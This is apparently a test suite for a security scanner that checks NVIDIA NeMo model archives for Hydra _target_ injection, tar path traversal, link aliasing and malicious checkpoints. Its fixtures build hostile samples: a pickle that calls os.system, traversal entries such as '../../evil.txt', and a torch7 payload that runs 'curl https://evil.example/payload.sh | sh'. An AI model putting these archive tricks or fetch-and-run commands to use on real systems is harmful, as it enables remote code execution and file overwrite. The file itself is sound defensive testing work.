"""Tests for CVE-2025-23304: NVIDIA NeMo Hydra _target_ injection."""

import gzip
import io
import pickle
import tarfile
import zipfile
from pathlib import Path
from typing import Any, Literal

import pytest

try:
    import yaml

    HAS_YAML = True
except ImportError:
    HAS_YAML = False

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
from modelaudit.scanners import nemo_scanner as nemo_scanner_module
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.nemo_scanner import NemoScanner, _get_nested_scanner_for_file
from modelaudit.utils.file import detection as file_detection

_TMP_PATH_MARKER = "__MODELAUDIT_TMP__/"
_NemoTarWriteMode = Literal["w", "w:gz"]


def _create_nemo_file_from_bytes(
    tmp_path: Path,
    config_bytes: bytes,
    filename: str = "model.nemo",
    config_name: str = "model_config.yaml",
    mode: _NemoTarWriteMode = "w",
) -> Path:
    """Helper to create a .nemo tar file with the given YAML config."""
    nemo_path = tmp_path / filename
    with tarfile.open(nemo_path, mode) as tar:
        info = tarfile.TarInfo(name=config_name)
        info.size = len(config_bytes)
        tar.addfile(info, io.BytesIO(config_bytes))
    return nemo_path


def _create_nemo_file(
    tmp_path: Path,
    config_dict: dict[str, Any] | None,
    filename: str = "model.nemo",
    config_name: str = "model_config.yaml",
    mode: _NemoTarWriteMode = "w",
) -> Path:
    """Helper to create a .nemo tar file with the given YAML config."""
    if config_dict is None:
        nemo_path = tmp_path / filename
        with tarfile.open(nemo_path, mode):
            pass
        return nemo_path

    config_bytes = yaml.safe_dump(config_dict).encode() if HAS_YAML else b"{}"
    return _create_nemo_file_from_bytes(tmp_path, config_bytes, filename=filename, config_name=config_name, mode=mode)


def _add_tar_bytes(tar: tarfile.TarFile, name: str, payload: bytes) -> None:
    info = tarfile.TarInfo(name=name)
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))


def _build_nemo_tar_bytes(config_bytes: bytes, *, mode: _NemoTarWriteMode = "w:gz") -> bytes:
    archive = io.BytesIO()
    with tarfile.open(fileobj=archive, mode=mode) as tar:
        _add_tar_bytes(tar, "model_config.yaml", config_bytes)
    return archive.getvalue()


def _materialize_tmp_paths(value: Any, tmp_path: Path) -> Any:
    """Replace fixture path markers without relying on host-global temp paths."""
    if isinstance(value, str) and value.startswith(_TMP_PATH_MARKER):
        return str(tmp_path / value.removeprefix(_TMP_PATH_MARKER))
    if isinstance(value, dict):
        return {key: _materialize_tmp_paths(item, tmp_path) for key, item in value.items()}
    if isinstance(value, list):
        return [_materialize_tmp_paths(item, tmp_path) for item in value]
    return value


def _build_malicious_pickle() -> bytes:
    import os as os_module

    class DangerousPayload:
        def __reduce__(self) -> tuple[Any, tuple[str]]:
            return (os_module.system, ("echo nemo-checkpoint-test",))

    return pickle.dumps(DangerousPayload())


class TestNemoScannerBasic:
    """Basic scanner functionality tests."""

    def test_scanner_available(self):
        scanner = NemoScanner()
        assert scanner.name == "nemo"

    def test_can_handle_nemo_file(self, tmp_path):
        path = _create_nemo_file(tmp_path, {"model": "test"})
        assert NemoScanner.can_handle(str(path))

    def test_rejects_non_tar(self, tmp_path):
        path = tmp_path / "model.nemo"
        path.write_bytes(b"not a tar file")
        assert not NemoScanner.can_handle(str(path))

    def test_rejects_wrong_extension(self, tmp_path):
        path = tmp_path / "model.pt"
        with tarfile.open(path, "w") as tar:
            info = tarfile.TarInfo(name="config.yaml")
            info.size = 0
            tar.addfile(info, io.BytesIO(b""))
        assert not NemoScanner.can_handle(str(path))

    def test_valid_nemo_does_not_trigger_file_type_mismatch(self, tmp_path):
        """Valid .nemo tar archives should not be flagged as spoofed file types."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": "nemo.Model"}})

        result = NemoScanner().scan(str(path))

        mismatch_checks = [
            c
            for c in result.checks
            if c.name == "File Type Validation"
            and c.status != CheckStatus.PASSED
            and "extension indicates nemo but magic bytes indicate tar" in c.message
        ]
        assert len(mismatch_checks) == 0

    def test_gzip_framed_nemo_keeps_nemo_ownership_when_header_stays_gzip(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Validated gzip TARs remain NeMo-owned when routing retains gzip framing."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": "nemo.Model"}}, mode="w:gz")
        monkeypatch.setattr("modelaudit.core.detect_file_format", lambda _path: "gzip")

        file_result = scan_file(str(path), config={"cache_scan_results": False})
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        assert file_result.scanner_name == "nemo"
        assert not [check for check in file_result.checks if check.rule_code == "S901"]
        assert aggregate_result.scanner_names == ["nemo"]
        assert not [issue for issue in aggregate_result.issues if issue.severity == IssueSeverity.CRITICAL]
        assert determine_exit_code(aggregate_result) == 0

    def test_gzip_framed_malicious_nemo_keeps_nemo_findings_when_header_stays_gzip(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Retained gzip framing must not hide NeMo Hydra findings from either API."""
        path = _create_nemo_file_from_bytes(
            tmp_path,
            b"model:\n  _target_: os.system\n  command: echo pwned\n",
            mode="w:gz",
        )
        monkeypatch.setattr("modelaudit.core.detect_file_format", lambda _path: "gzip")

        file_result = scan_file(str(path), config={"cache_scan_results": False})
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        assert file_result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == "os.system"
            for check in file_result.checks
        )
        assert aggregate_result.scanner_names == ["nemo"]
        assert any(
            issue.severity == IssueSeverity.CRITICAL and issue.details.get("target") == "os.system"
            for issue in aggregate_result.issues
        )
        assert determine_exit_code(aggregate_result) == 1

    def test_malformed_gzip_nemo_still_reports_s901(self, tmp_path: Path) -> None:
        """A .nemo suffix plus gzip magic is not enough unless it is a valid TAR."""
        path = tmp_path / "model.nemo"
        path.write_bytes(b"\x1f\x8b\x08\x00truncated")

        result = scan_file(str(path), config={"cache_scan_results": False})

        s901_checks = [check for check in result.checks if check.rule_code == "S901"]
        assert result.scanner_name == "compressed"
        assert s901_checks
        assert any(
            check.details.get("extension_format") == "nemo" and check.details.get("header_format") == "gzip"
            for check in s901_checks
        )

    def test_gzip_non_tar_nemo_still_reports_s901(self, tmp_path: Path) -> None:
        """A valid gzip stream with non-TAR content is still a spoofed .nemo container."""
        path = tmp_path / "model.nemo"
        path.write_bytes(gzip.compress(b"not a tar archive"))

        result = scan_file(str(path), config={"cache_scan_results": False})

        s901_checks = [check for check in result.checks if check.rule_code == "S901"]
        assert result.scanner_name == "compressed"
        assert s901_checks
        assert any(
            check.details.get("extension_format") == "nemo" and check.details.get("header_format") == "gzip"
            for check in s901_checks
        )

    def test_concatenated_gzip_nemo_fails_closed_after_tar_eof(self, tmp_path: Path) -> None:
        """A second gzip member after TAR EOF must not be hidden by direct NeMo ownership."""
        path = tmp_path / "concat.nemo"
        path.write_bytes(
            _build_nemo_tar_bytes(b"model:\n  _target_: nemo.Model\n")
            + _build_nemo_tar_bytes(b"model:\n  _target_: os.system\n  command: echo pwned\n")
        )

        direct_result = scan_file(str(path), config={"cache_scan_results": False})
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        integrity_checks = [
            check
            for check in direct_result.checks
            if check.name == "Compressed TAR Stream Integrity" and check.status == CheckStatus.FAILED
        ]
        assert direct_result.scanner_name == "nemo"
        assert direct_result.success is False
        assert integrity_checks
        assert integrity_checks[0].rule_code == "S902"
        assert "non-zero trailing data" in integrity_checks[0].message
        assert aggregate_result.success is False
        assert determine_exit_code(aggregate_result) == 2

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            cached_aggregate = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

            assert cached_aggregate.success is False
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_concatenated_gzip_nemo_raw_member_fails_closed_after_tar_eof(self, tmp_path: Path) -> None:
        """A non-TAR gzip member after TAR EOF must not be hidden by direct NeMo ownership."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": "nemo.Model"}}, mode="w:gz")
        path.write_bytes(path.read_bytes() + gzip.compress(_build_malicious_pickle()))

        direct_result = scan_file(str(path), config={"cache_scan_results": False})
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        integrity_checks = [
            check
            for check in direct_result.checks
            if check.name == "Compressed TAR Stream Integrity" and check.status == CheckStatus.FAILED
        ]
        assert file_detection.validate_file_type(str(path)) is False
        assert direct_result.scanner_name == "nemo"
        assert direct_result.success is False
        assert integrity_checks
        assert integrity_checks[0].rule_code == "S902"
        assert "non-zero trailing data" in integrity_checks[0].message
        assert aggregate_result.success is False
        assert determine_exit_code(aggregate_result) != 0

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            cached_aggregate = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

            assert cached_aggregate.success is False
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_concatenated_gzip_nemo_detects_nonzero_tail_after_zero_padding(self, tmp_path: Path) -> None:
        """Post-EOF validation must not stop before hidden non-zero gzip member data."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": "nemo.Model"}}, mode="w:gz")
        path.write_bytes(path.read_bytes() + gzip.compress((b"\0" * (64 * 1024 + 1)) + _build_malicious_pickle()))

        result = scan_file(
            str(path),
            config={
                "cache_scan_results": False,
                "compressed_max_decompressed_bytes": 2 * 1024 * 1024,
                "compressed_max_decompression_ratio": 100000.0,
            },
        )

        integrity_checks = [
            check
            for check in result.checks
            if check.name == "Compressed TAR Stream Integrity" and check.status == CheckStatus.FAILED
        ]
        assert result.scanner_name == "nemo"
        assert result.success is False
        assert integrity_checks
        assert integrity_checks[0].rule_code == "S902"
        assert "non-zero trailing data" in integrity_checks[0].message

    def test_zero_tail_gzip_nemo_fails_closed_when_post_eof_tail_exceeds_limit(self, tmp_path: Path) -> None:
        """All-zero post-EOF gzip data is still incomplete when policy limits prevent full validation."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": "nemo.Model"}}, mode="w:gz")
        path.write_bytes(path.read_bytes() + gzip.compress(b"\0" * (128 * 1024)))

        result = scan_file(
            str(path),
            config={
                "cache_scan_results": False,
                "compressed_max_decompressed_bytes": 64 * 1024,
                "compressed_max_decompression_ratio": 100000.0,
            },
        )

        integrity_checks = [
            check
            for check in result.checks
            if check.name == "Compressed TAR Stream Integrity" and check.status == CheckStatus.FAILED
        ]
        assert result.scanner_name == "nemo"
        assert result.success is False
        assert integrity_checks
        assert integrity_checks[0].rule_code == "S902"
        assert "could not be fully validated" in integrity_checks[0].message

    def test_truncated_gzip_nemo_fails_closed_after_tar_eof(self, tmp_path: Path) -> None:
        """A readable TAR prefix is not enough when the outer gzip stream is incomplete."""
        path = tmp_path / "truncated.nemo"
        payload = _build_nemo_tar_bytes(b"model:\n  _target_: nemo.Model\n")
        path.write_bytes(payload[:-1])

        result = scan_file(str(path), config={"cache_scan_results": False})

        integrity_checks = [
            check
            for check in result.checks
            if check.name == "Compressed TAR Stream Integrity" and check.status == CheckStatus.FAILED
        ]
        assert result.scanner_name == "nemo"
        assert result.success is False
        assert integrity_checks
        assert integrity_checks[0].rule_code == "S902"
        assert "could not be fully validated" in integrity_checks[0].message

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            cached_aggregate = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

            assert cached_aggregate.success is False
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_truncated_gzip_nemo_keeps_nemo_ownership_when_header_stays_gzip(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Retained gzip headers with invalid TAR tails still fail closed as NeMo-owned scans."""
        path = tmp_path / "truncated-retained-gzip.nemo"
        payload = _build_nemo_tar_bytes(b"model:\n  _target_: nemo.Model\n")
        path.write_bytes(payload[:-1])
        monkeypatch.setattr("modelaudit.core.detect_file_format", lambda _path: "gzip")

        direct_result = scan_file(str(path), config={"cache_scan_results": False})
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        integrity_checks = [
            check
            for check in direct_result.checks
            if check.name == "Compressed TAR Stream Integrity" and check.status == CheckStatus.FAILED
        ]
        assert direct_result.scanner_name == "nemo"
        assert direct_result.success is False
        assert integrity_checks
        assert integrity_checks[0].rule_code == "S902"
        assert "could not be fully validated" in integrity_checks[0].message
        assert aggregate_result.scanner_names == ["nemo"]
        assert aggregate_result.success is False
        assert determine_exit_code(aggregate_result) == 2

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            cached_aggregate = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

            assert cached_aggregate.success is False
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_truncated_gzip_nemo_keeps_s902_when_magic_route_is_tar(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Mixed gzip header and TAR magic routing must still validate the gzip tail."""
        path = tmp_path / "truncated-gzip-magic-tar.nemo"
        payload = _build_nemo_tar_bytes(b"model:\n  _target_: nemo.Model\n")
        path.write_bytes(payload[:-1])
        monkeypatch.setattr("modelaudit.core.detect_file_format", lambda _path: "gzip")
        monkeypatch.setattr("modelaudit.core.detect_file_format_from_magic", lambda _path: "tar")

        direct_result = scan_file(str(path), config={"cache_scan_results": False})
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        integrity_checks = [
            check
            for check in direct_result.checks
            if check.name == "Compressed TAR Stream Integrity" and check.status == CheckStatus.FAILED
        ]
        assert direct_result.scanner_name == "nemo"
        assert direct_result.success is False
        assert integrity_checks
        assert integrity_checks[0].rule_code == "S902"
        assert aggregate_result.scanner_names == ["nemo"]
        assert aggregate_result.success is False
        assert determine_exit_code(aggregate_result) == 2

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            cached_aggregate = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

            assert cached_aggregate.success is False
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_missing_yaml_dependency_is_reported_as_warning(self, tmp_path, monkeypatch):
        """Missing PyYAML should be a non-passing warning, not a pass."""
        path = _create_nemo_file(tmp_path, {"model": "test"})
        monkeypatch.setattr("modelaudit.scanners.nemo_scanner.HAS_YAML", False)
        scanner = NemoScanner()
        result = scanner.scan(str(path))

        checks = [c for c in result.checks if c.name == "YAML Parser Availability"]
        assert len(checks) == 1
        assert checks[0].status != CheckStatus.PASSED
        assert checks[0].severity == IssueSeverity.WARNING

    def test_get_nested_scanner_for_file_delegates_to_registry(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        captured: dict[str, object] = {}
        sentinel = object()

        def fake_get_scanner_for_file(path: str, *, config: dict[str, Any]) -> object:
            captured["path"] = path
            captured["config"] = config
            return sentinel

        monkeypatch.setattr("modelaudit.scanners.get_scanner_for_file", fake_get_scanner_for_file)

        config = {"max_nemo_checkpoint_scan_bytes": 1024}

        assert _get_nested_scanner_for_file("/tmp/model_weights.ckpt", config=config) is sentinel
        assert captured["path"] == "/tmp/model_weights.ckpt"
        assert captured["config"] is config


@pytest.mark.skipif(not HAS_YAML, reason="PyYAML not installed")
class TestNemoArchiveVulnerabilityCoverage:
    """Tests for NeMo archive traversal and checkpoint deserialization coverage."""

    def test_relative_member_path_traversal_detects_cve_2025_23360(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "traversal.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "../../evil.txt", b"overwrite")

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23360"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        details = cve_checks[0].details
        assert details["cvss"] == 7.1
        assert details["cwe"] == "CWE-23"
        assert "remediation" in details

    def test_gzip_framed_member_path_traversal_still_detected(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "traversal.nemo"
        with tarfile.open(nemo_path, "w:gz") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "../../evil.txt", b"overwrite")

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.rule_code == "S901"]
        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23360"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL

    def test_absolute_member_path_traversal_detects_cve_2025_23250(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "absolute.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "/tmp/evil.txt", b"overwrite")

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23250"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["cvss"] == 7.6
        assert cve_checks[0].details["cwe"] == "CWE-22"

    def test_symlink_escape_detects_relative_path_traversal_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "symlink.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            link_info = tarfile.TarInfo(name="weights_link")
            link_info.type = tarfile.SYMTYPE
            link_info.linkname = "../../outside_weights.ckpt"
            tar.addfile(link_info)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23360"]
        assert len(cve_checks) == 1
        assert cve_checks[0].details["entry"] == "weights_link"
        assert cve_checks[0].details["target"] == "../../outside_weights.ckpt"

    def test_gzip_framed_symlink_escape_still_detected(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "symlink.nemo"
        with tarfile.open(nemo_path, "w:gz") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            link_info = tarfile.TarInfo(name="weights_link")
            link_info.type = tarfile.SYMTYPE
            link_info.linkname = "../../outside_weights.ckpt"
            tar.addfile(link_info)

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.rule_code == "S901"]
        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23360"]
        assert len(cve_checks) == 1
        assert cve_checks[0].details["entry"] == "weights_link"
        assert cve_checks[0].details["target"] == "../../outside_weights.ckpt"

    def test_normalized_safe_member_path_not_flagged_as_traversal(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "normalized-safe.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "configs/../model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "weights/../model_weights.ckpt", b"not a pickle")

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23360"]
        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23250"]

    def test_malicious_checkpoint_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-rce.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.ckpt", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        details = cve_checks[0].details
        assert details["cvss"] == 7.6
        assert details["cwe"] == "CWE-502"
        assert "CVE-2026-24157" in details["related_cves"]
        assert details["nested_scanner"] == "pickle"

    def test_gzip_framed_malicious_checkpoint_still_detected(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-rce.nemo"
        with tarfile.open(nemo_path, "w:gz") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.ckpt", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.rule_code == "S901"]
        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL

    def test_torch7_checkpoint_with_pt_suffix_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "torch7-checkpoint-rce.nemo"
        torch7_payload = (
            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
        )
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["nested_scanner"] == "torch7"

    def test_marker_form_torch7_checkpoint_with_pt_suffix_detects_nemo_deserialization_cve(
        self, tmp_path: Path
    ) -> None:
        nemo_path = tmp_path / "marker-torch7-checkpoint-rce.nemo"
        torch7_payload = (
            b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example/payload.sh | sh')\n"
        )
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["nested_scanner"] == "torch7"

    def test_duplicate_checkpoint_replacement_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "duplicate-checkpoint-rce.nemo"
        torch7_payload = (
            b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example/payload.sh | sh')\n"
        )
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.pt", b"safe weights")
            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["nested_scanner"] == "torch7"

    def test_symlink_checkpoint_alias_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-symlink-alias.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            link_info = tarfile.TarInfo(name="model_weights.ckpt")
            link_info.type = tarfile.SYMTYPE
            link_info.linkname = "payload.pkl"
            tar.addfile(link_info)
            _add_tar_bytes(tar, "payload.pkl", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL

    def test_subdirectory_hardlink_checkpoint_alias_resolves_target_from_archive_root(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-hardlink-alias.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.pkl", _build_malicious_pickle())
            link_info = tarfile.TarInfo(name="assets/model_weights.ckpt")
            link_info.type = tarfile.LNKTYPE
            link_info.linkname = "payload.pkl"
            tar.addfile(link_info)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249"
            and check.details.get("entry") == "assets/model_weights.ckpt"
        ]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL

    def test_forward_hardlink_checkpoint_alias_does_not_report_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-forward-hardlink-alias.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            link_info = tarfile.TarInfo(name="model_weights.ckpt")
            link_info.type = tarfile.LNKTYPE
            link_info.linkname = "payload.bin"
            tar.addfile(link_info)
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
        assert "nemo_checkpoint_link_target_unresolved" in result.metadata["scan_outcome_reasons"]

    def test_backward_hardlink_checkpoint_alias_chain_detects_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-backward-hardlink-chain.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "payload.bin"
            tar.addfile(alias_link)
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "alias.bin"
            tar.addfile(checkpoint_link)

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_detects_later_target_replacement(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-later-hardlink-replacement.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_preserves_content_after_target_symlink_rebinding(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-hardlink-target-rebinding.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            target_rebinding = tarfile.TarInfo(name="payload.bin")
            target_rebinding.type = tarfile.SYMTYPE
            target_rebinding.linkname = "safe.bin"
            tar.addfile(target_rebinding)
            _add_tar_bytes(tar, "payload.bin", b"safe weights")

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_detects_write_through_later_hardlink_alias(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-later-hardlink-alias-write.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            alias_link = tarfile.TarInfo(name="alias.bin")
            alias_link.type = tarfile.LNKTYPE
            alias_link.linkname = "model_weights.ckpt"
            tar.addfile(alias_link)
            _add_tar_bytes(tar, "alias.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_hardlink_checkpoint_alias_detects_write_through_later_symlink_alias(self, tmp_path: Path) -> None:
